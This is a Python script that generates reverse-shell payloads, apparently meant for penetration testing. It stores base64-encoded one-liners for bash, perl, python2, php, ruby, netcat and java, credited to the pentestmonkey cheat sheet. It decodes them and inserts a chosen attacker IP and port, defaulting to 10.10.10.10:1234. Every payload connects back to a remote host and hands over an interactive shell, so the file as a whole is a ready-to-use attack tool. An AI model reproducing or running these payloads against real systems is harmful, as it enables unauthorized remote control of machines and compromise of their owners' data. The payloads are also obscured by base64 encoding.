import argparse
import base64
import sys


parser = argparse.ArgumentParser(description="This is a Shell generator from ancx002 :)")

parser.add_argument("-t","--type", type=str, help="which shell", dest="type")
parser.add_argument("-l", "--list", type=int, help="list the available shells", dest="list")
parser.add_argument("-i","--ip", type=str, help="your ip")
parser.add_argument("-p","--port", type=int, help="your port")
parser.add_argument("-a", "--all", action="store_true",help="show all shells")

args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])
shell_dict = {
    "bash" : ['YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=',],
    "perl" : ['cGVybCAtZSAndXNlIFNvY2tldDskaT0iezB9IjskcD17MX07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307',],
    "python2" : ['cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=',],
    "php" : ['cGhwIC1yICckc29jaz1mc29ja29wZW4oInswfSIsezF9KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=',],
    "ruby" : ['cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7MH0iLHsxfSkudG9faTtleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgPCYlZCA+JiVkIDI+JiVkIixmLGYsZikn',],
    "netcat" : ['bmMgLWUgL2Jpbi9zaCB7MH0gezF9','cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgezB9IHsxfSA+L3RtcC9m',],
    "java" : ['ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpCnAgPSByLmV4ZWMoWyIvYmluL2Jhc2giLCItYyIsImV4ZWMgNTw+L2Rldi90Y3AvezB9L3sxfTtjYXQgPCY1IHwgd2hpbGUgcmVhZCBsaW5lOyBkbyBcJGxpbmUgMj4mNSA+JjU7IGRvbmUiXSBhcyBTdHJpbmdbXSkKcC53YWl0Rm9yKCk=',],

}

'''
Reverse shells are from Pentester Monkey reverse shell cheetsheet
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
'''

if args.ip or args.port != None:
    ipaddr = args.ip
    portnum = args.port
else:
    ipaddr = "10.10.10.10"
    portnum = 1234

if args.type:
    for n,v in shell_dict.items():
        for i in v:
            if n == args.type:
                sh = base64.b64decode(i).decode('utf-8')
                print("\n" + sh.format(ipaddr, portnum))

if args.list:
    print("\n" + "[*] Available Shells [*]\n")
    for n,v in shell_dict.items():
        print(n)

if args.all:
    print("\n"+ "[*] All shells Generated [*]\n")
    for n,v in shell_dict.items():
        for i in v:
            sh = base64.b64decode(i).decode('utf-8')
            print("\n" + sh.format(ipaddr, portnum))



   


